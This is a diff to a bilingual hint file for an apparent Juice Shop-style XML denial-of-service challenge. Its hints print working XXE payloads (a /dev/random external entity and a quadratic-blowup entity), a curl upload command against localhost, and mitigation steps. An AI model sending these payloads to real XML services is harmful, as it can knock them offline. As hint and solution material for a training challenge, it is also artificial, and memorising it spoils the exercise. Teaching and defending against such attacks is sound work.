@@ -20,19 +20,21 @@ hints:
   N2:
     cost_pct: 10
     text_fr: |
-      L'attaque classique = "Billion Laughs"
-      ou "XML bomb". Recursive entity
-      expansion exponentielle. Le parser
-      consomme exponential memory/CPU pour
-      expand les entities.
+      L'attaque classique = "Billion Laughs".
+      MAIS libxml2 v2.7+ detecte les entity
+      loops et retourne HTTP 410. Le classique
+      ne marche pas. Variantes qui passent :
+      (a) /dev/random external entity (Linux),
+      (b) Quadratic blowup (entite repetee).
     text_en: |
-      Classic attack = "Billion Laughs" or
-      "XML bomb". Exponential recursive
-      entity expansion. Parser consumes
-      exponential memory/CPU to expand
-      entities.
+      Classic attack = "Billion Laughs". BUT
+      libxml2 v2.7+ detects entity loops and
+      returns HTTP 410. Classic no longer
+      works. Working variants: (a) /dev/random
+      external entity (Linux), (b) Quadratic
+      blowup (single entity repeated).
     pedagogical_intent: |
-      Spell attack name.
+      Spell attack name + variantes.
 
   N3:
     cost_pct: 20
@@ -56,113 +58,146 @@ hints:
   N4:
     cost_pct: 35
     text_fr: |
-      Payload billion laughs :
+      Payload (a) /dev/random Linux only :
       ```xml
       <?xml version="1.0"?>
-      <!DOCTYPE lolz [
-        <!ENTITY lol "lol">
-        <!ENTITY lol2 "&lol;&lol;&lol;
-          &lol;&lol;&lol;&lol;&lol;&lol;
-          &lol;">
-        <!ENTITY lol3 "&lol2;&lol2;&lol2;
-          &lol2;&lol2;&lol2;&lol2;&lol2;
-          &lol2;&lol2;">
-        ...
-        <!ENTITY lol9 "...">
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM
+          "file:///dev/random">
       ]>
-      <lolz>&lol9;</lolz>
+      <foo>&xxe;</foo>
       ```
-      Each level expand x10. 9 levels =
-      10^9 entities = billion laughs.
+      /dev/random produit un flux infini, le
+      parser timeout >2sec. Payload (b)
+      quadratic blowup :
+      ```xml
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY a "aaaa...aaaa"
+          (50000 chars)>
+      ]>
+      <foo>&a;&a;&a;...&a;</foo>
+      ```
+      Une seule entite, repetee 50k fois
+      dans le doc.
     text_en: |
-      Billion laughs payload:
+      Payload (a) /dev/random Linux only:
       ```xml
       <?xml version="1.0"?>
-      <!DOCTYPE lolz [
-        <!ENTITY lol "lol">
-        <!ENTITY lol2 "&lol;&lol;&lol;
-          &lol;&lol;&lol;&lol;&lol;&lol;
-          &lol;">
-        <!ENTITY lol3 "&lol2;&lol2;&lol2;
-          &lol2;&lol2;&lol2;&lol2;&lol2;
-          &lol2;&lol2;">
-        ...
-        <!ENTITY lol9 "...">
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM
+          "file:///dev/random">
       ]>
-      <lolz>&lol9;</lolz>
+      <foo>&xxe;</foo>
       ```
-      Each level expands x10. 9 levels =
-      10^9 entities = billion laughs.
+      /dev/random produces infinite stream,
+      parser timeouts >2sec. Payload (b)
+      quadratic blowup:
+      ```xml
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY a "aaaa...aaaa"
+          (50000 chars)>
+      ]>
+      <foo>&a;&a;&a;...&a;</foo>
+      ```
+      Single entity, repeated 50k times in
+      the doc.
     pedagogical_intent: |
-      Spell exact payload.
+      Spell working payload (PDF p.408).
 
   N5:
     cost_pct: 50
     text_fr: |
-      [KILL_CHAIN_DOCUMENTED] Workflow :
+      Workflow :
       1. Pre-requis :
          deprecatedInterfaceChallenge.
-      2. Save le billion laughs payload
-         dans `bomb.xml` (9 levels of
-         entity recursion x10 each).
-      3. Upload via curl :
-         ```bash
-         curl -X POST
-           http://localhost:3000/file-upload
-           -F "file=@bomb.xml"
-           -H "Authorization: Bearer
-             <token>"
+      2. NE PAS utiliser le billion laughs
+         classique : libxml2 v2.7+ detecte
+         entity loops et retourne 410
+         "Detected an entity reference
+         loop" (PDF Bjoern p.408).
+      3. Methode (a) Linux only - save
+         dans bomb.xml :
+         ```xml
+         <!DOCTYPE foo [
+           <!ENTITY xxe SYSTEM
+             "file:///dev/random">]>
+         <foo>&xxe;</foo>
          ```
-      4. Le serveur :
+      4. OU Methode (b) quadratic blowup
+         (toutes plateformes) - une entite
+         de 50000 chars repetee 50000 fois
+         dans le doc.
+      5. Upload via curl :
+         curl -X POST localhost:3000/
+         file-upload -F "file=@bomb.xml"
+         -H "Authorization: Bearer <t>"
+      6. Serveur :
          (a) handleXmlUpload accepte .xml
-         (b) libxml.parseXml entity
-             expansion explose
-         (c) timeout 2000ms reache
-         (d) error message 'Script
+         (b) libxml.parseXml(noent:true)
+             ouvre /dev/random ou expand
+             entity quadratic
+         (c) vm timeout 2000ms reache
+         (d) errorMessage 'Script
              execution timed out'
-         (e) catch block trigger solve
-             xxeDosChallenge.
-      Note : effectiveness depends on OS
-      (hint #4) - Linux/Mac peuvent
-      timeout differently. Sur Docker,
-      effective.
-      Source : routes/fileUpload.ts:91-92
-      + CVE-2003-1564 + OWASP XXE
-      Prevention.
-      Defense : disable DOCTYPE +
-      entity expansion limits + sandbox
-      memory.
+         (e) catch trigger solve.
+      Source : routes/fileUpload.ts:83-92
+      + PDF Bjoern Kimminich p.408 +
+      OWASP XXE Prevention.
+      Defense : (1) Disable DOCTYPE
+      (`doctype: false`), (2) Disable
+      entity resolver (noent: false +
+      entityResolver: false), (3) libxml
+      `huge: false` (default v2.7+),
+      (4) cgroup memory + ulimit, (5)
+      Sandbox container Docker
+      `--memory=512m`.
     text_en: |
-      [KILL_CHAIN_DOCUMENTED] Workflow:
+      Workflow:
       1. Prerequisite:
          deprecatedInterfaceChallenge.
-      2. Save billion laughs payload in
-         `bomb.xml` (9 levels of entity
-         recursion x10 each).
-      3. Upload via curl:
-         ```bash
-         curl -X POST
-           http://localhost:3000/file-upload
-           -F "file=@bomb.xml"
-           -H "Authorization: Bearer
-             <token>"
+      2. DO NOT use classic billion
+         laughs: libxml2 v2.7+ detects
+         entity loops and returns 410
+         "Detected an entity reference
+         loop" (PDF Bjoern p.408).
+      3. Method (a) Linux only - save in
+         bomb.xml:
+         ```xml
+         <!DOCTYPE foo [
+           <!ENTITY xxe SYSTEM
+             "file:///dev/random">]>
+         <foo>&xxe;</foo>
          ```
-      4. Server:
+      4. OR Method (b) quadratic blowup
+         (all platforms) - one 50000-char
+         entity repeated 50000 times in
+         the doc.
+      5. Upload via curl:
+         curl -X POST localhost:3000/
+         file-upload -F "file=@bomb.xml"
+         -H "Authorization: Bearer <t>"
+      6. Server:
          (a) handleXmlUpload accepts .xml
-         (b) libxml.parseXml entity
-             expansion explodes
-         (c) timeout 2000ms reached
-         (d) error message 'Script
+         (b) libxml.parseXml(noent:true)
+             opens /dev/random or expands
+             quadratic entity
+         (c) vm timeout 2000ms reached
+         (d) errorMessage 'Script
              execution timed out'
-         (e) catch block triggers solve
-             xxeDosChallenge.
-      Note: effectiveness depends on OS
-      (hint #4) - Linux/Mac may timeout
-      differently. On Docker, effective.
-      Source: routes/fileUpload.ts:91-92
-      + CVE-2003-1564 + OWASP XXE
-      Prevention.
-      Defense: disable DOCTYPE + entity
-      expansion limits + sandbox memory.
+         (e) catch triggers solve.
+      Source: routes/fileUpload.ts:83-92
+      + PDF Bjoern Kimminich p.408 +
+      OWASP XXE Prevention.
+      Defense: (1) Disable DOCTYPE
+      (`doctype: false`), (2) Disable
+      entity resolver (noent: false +
+      entityResolver: false), (3) libxml
+      `huge: false` (default v2.7+),
+      (4) cgroup memory + ulimit, (5)
+      Docker sandbox
+      `--memory=512m`.
     pedagogical_intent: |
-      Solution + payload + defense.
+      Solution + working payload + defense
+      (PDF Bjoern verified).
